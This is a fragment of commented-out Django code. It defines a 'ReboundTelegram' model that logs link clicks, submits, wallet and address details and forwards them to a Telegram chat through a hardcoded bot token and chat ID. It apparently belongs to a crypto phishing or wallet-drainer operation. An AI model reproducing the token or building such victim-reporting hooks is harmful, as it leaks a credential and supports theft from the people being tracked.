...
# models.py
# class ReboundTelegram(models.Model):
#     STATUS_CHOICES = (
#         ('New Message Chat', 'New Message Chat'),
#         ('Following a link', 'Переход по ссылке'),
#         ('Clicking / Submit', 'Нажатие / Отправить'),
...
#         bot_token = '6618511647:AAEin9mETWRzdb8Z4OlUFf0rkgyH29nZGdI'  # Ваш токен бота Telegram
#         chat_id = '-967385327'  # ID чата, куда вы хотите отправлять сообщения
#
#         message = f"Статус: {self.status}\nПлатформа: {self.platform}\n" \
#                   f"Кошелек: {self.wallet}\nАдрес: {self.address}\n" \
...
#
#
# @receiver(post_save, sender=ReboundTelegram)
